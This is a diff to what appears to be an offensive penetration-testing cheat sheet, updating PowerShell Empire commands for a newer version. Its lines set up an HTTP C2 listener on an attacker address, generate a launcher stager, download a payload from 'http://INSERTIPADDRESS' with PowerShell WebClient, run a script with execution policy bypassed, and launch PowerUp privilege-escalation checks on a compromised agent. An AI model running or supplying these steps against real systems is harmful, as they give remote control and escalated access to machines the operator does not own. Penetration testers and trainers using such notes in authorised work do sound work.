@@ -491,10 +491,9 @@ powershell -ExecutionPolicy Bypass -NoExit -File shell_80.ps1
 OR
 
 Empire:
-python /opt/Empire/empire
+powershell-empire
 listeners
 uselistener http
-set Name INSERTIPADDRESS
 set Host http://MYIPADDRESS
 execute
 
@@ -503,9 +502,9 @@ launcher powershell INSERTIPADDRESS
 Copy and paste output in terminal
 
 ***If you need a stager***
-usestager windows/launcher_bat (or whatever can run on host)
-set Listener INSERTIPADDRESS
-generate 
+usestager multi/launcher (or whatever can run on host)
+set Listener http
+execute
 
 Upload and run payload
 cd /tmp
@@ -516,8 +515,8 @@ powershell -c (New-Object System.Net.WebClient).DownloadFile('http://INSERTIPADD
 Once you get a connection
 agents
 interact <agent_name>
-usemodule privesc/powerup/allchecks
 set Agent <agent_name>
+usemodule privesc/powerup/allchecks
 execute 
 ***Let run for a few minutes
 
